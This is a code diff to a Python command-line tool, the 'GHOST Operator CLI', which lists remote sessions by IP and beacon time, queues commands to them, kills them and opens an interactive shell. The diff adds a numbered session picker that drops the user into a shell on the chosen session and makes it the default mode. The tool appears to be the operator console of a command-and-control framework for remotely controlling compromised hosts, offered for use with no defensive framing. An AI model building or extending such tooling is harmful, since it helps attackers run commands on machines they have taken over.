@@ -1,5 +1,5 @@
 """
-GHOST Operator CLI – Fully Working with Enhanced Session Display
+GHOST Operator CLI – Fully Interactive with Session Picker
 """
 import argparse
 import json
@@ -48,13 +48,11 @@ def warn(msg: str) -> None: print(c(f"[-] {msg}", YELLOW))
 # ---------------------------------------------------------------------------
 
 def human_time_ago(iso_time: str) -> str:
-    """Return a relative time string like '5s ago', '2m ago', '1h ago'."""
     try:
         dt = datetime.fromisoformat(iso_time)
     except Exception:
         return iso_time[:19]
     now = datetime.now(timezone.utc)
-    # If the timestamp is naive, assume it's UTC (Worker uses UTC)
     if dt.tzinfo is None:
         dt = dt.replace(tzinfo=timezone.utc)
     diff = (now - dt).total_seconds()
@@ -71,7 +69,6 @@ def human_time_ago(iso_time: str) -> str:
         return f"{days}d ago"
 
 def time_color(iso_time: str) -> str:
-    """Return a colour based on age."""
     try:
         dt = datetime.fromisoformat(iso_time)
     except Exception:
@@ -88,7 +85,7 @@ def time_color(iso_time: str) -> str:
         return RED
 
 # ---------------------------------------------------------------------------
-# Client – handles URL encoding automatically
+# Client – handles URL encoding
 # ---------------------------------------------------------------------------
 
 class GhostClient:
@@ -117,10 +114,6 @@ class GhostClient:
         resp.raise_for_status()
         return resp.json()
 
-    # ------------------------------------------------------------------
-    # API methods – encode sid in path
-    # ------------------------------------------------------------------
-
     def list_sessions(self) -> list:
         return self._get("/sessions")
 
@@ -144,7 +137,7 @@ class GhostClient:
         return self._get("/audit", params={"limit": limit})
 
 # ---------------------------------------------------------------------------
-# Display helpers – enhanced session table
+# Display helpers
 # ---------------------------------------------------------------------------
 
 def _idle_label(idle_sec: float) -> str:
@@ -156,14 +149,14 @@ def _idle_label(idle_sec: float) -> str:
         color = RED
     return c(f"{idle_sec:.0f}s", color)
 
-def print_sessions(sessions: list) -> None:
+def print_sessions(sessions: list, numbered: bool = False) -> None:
     if not sessions:
         warn("No active sessions.")
         return
 
-    # Column widths
     col_w = [36, 16, 20, 10, 12, 7, 8]
     header = (
+        f"{'#':<4}" if numbered else ""
         f"{'SESSION ID':<{col_w[0]}} "
         f"{'REMOTE IP':<{col_w[1]}} "
         f"{'LAST SEEN':<{col_w[2]}} "
@@ -174,11 +167,10 @@ def print_sessions(sessions: list) -> None:
     )
     print()
     print(c(header, BOLD + CYAN))
-    print(c("-" * (sum(col_w) + len(col_w) - 1), GREY))
+    print(c("-" * (sum(col_w) + len(col_w) - 1 + (4 if numbered else 0)), GREY))
 
-    for s in sessions:
+    for idx, s in enumerate(sessions, start=1):
         last_beacon = s.get("last_beacon", "")
-        # Relative time with colour
         rel_time = human_time_ago(last_beacon)
         rel_col = time_color(last_beacon)
         last_seen_str = c(rel_time, rel_col)
@@ -191,7 +183,9 @@ def print_sessions(sessions: list) -> None:
         sid      = s["session"][:36]
         ip       = s.get("remote_ip", "?")[:16]
 
+        prefix = f"{c(str(idx), MAGENTA):<4}" if numbered else ""
         print(
+            f"{prefix}"
             f"{c(sid, MAGENTA):<{col_w[0]}} "
             f"{ip:<{col_w[1]}} "
             f"{last_seen_str:<{col_w[2]}} "
@@ -246,7 +240,7 @@ def print_audit(data: dict) -> None:
 
 def cmd_sessions(client: GhostClient, _args) -> None:
     data = client.list_sessions()
-    print_sessions(data)
+    print_sessions(data, numbered=False)
 
 def cmd_task(client: GhostClient, args) -> None:
     resp = client.task(args.sid, args.cmd)
@@ -317,6 +311,59 @@ def cmd_shell(client: GhostClient, args) -> None:
         if not got_result:
             warn("Timed out waiting for result (task still queued).")
 
+def cmd_console(client: GhostClient, _args) -> None:
+    """
+    Interactive session picker:
+    - Lists all active sessions with numbers.
+    - User selects a number → drops into shell for that session.
+    """
+    info("Fetching sessions...")
+    sessions = client.list_sessions()
+    if not sessions:
+        warn("No active sessions.")
+        return
+
+    print_sessions(sessions, numbered=True)
+
+    while True:
+        try:
+            choice = input(c("Select session number (or 'q' to quit): ", BOLD + CYAN)).strip()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            warn("Exiting.")
+            return
+
+        if choice.lower() in ("q", "quit", "exit"):
+            info("Goodbye.")
+            return
+
+        if not choice.isdigit():
+            warn("Invalid input – enter a number.")
+            continue
+
+        idx = int(choice) - 1
+        if idx < 0 or idx >= len(sessions):
+            warn(f"Invalid number – choose 1–{len(sessions)}")
+            continue
+
+        sid = sessions[idx]["session"]
+        info(f"Connecting to session {c(sid, MAGENTA)}...")
+        # Re‑enter shell mode with this session
+        # We'll reuse the shell logic by creating a mock args object
+        class MockArgs:
+            pass
+        shell_args = MockArgs()
+        shell_args.sid = sid
+        cmd_shell(client, shell_args)
+        # After shell exits, loop back to session list
+        info("Returning to session list.")
+        # Refresh list
+        sessions = client.list_sessions()
+        if not sessions:
+            warn("No active sessions left.")
+            return
+        print_sessions(sessions, numbered=True)
+
 # ---------------------------------------------------------------------------
 # Argument parser
 # ---------------------------------------------------------------------------
@@ -355,6 +402,9 @@ def build_parser() -> argparse.ArgumentParser:
     sh = sub.add_parser("shell", help="Interactive shell mode for a session")
     sh.add_argument("sid", help="Session ID")
 
+    # New interactive console command
+    sub.add_parser("console", help="Interactive session picker – list sessions, choose by number, get shell")
+
     return p
 
 # ---------------------------------------------------------------------------
@@ -368,6 +418,7 @@ COMMAND_MAP = {
     "kill":     cmd_kill,
     "audit":    cmd_audit,
     "shell":    cmd_shell,
+    "console":  cmd_console,
 }
 
 def main() -> None:
@@ -375,8 +426,8 @@ def main() -> None:
     args   = parser.parse_args()
 
     if not args.command:
-        parser.print_help()
-        sys.exit(0)
+        # If no command, default to 'console' (interactive picker)
+        args.command = "console"
 
     if not args.token:
         err("No operator token. Set --token or GHOST_OPERATOR_TOKEN env var.")
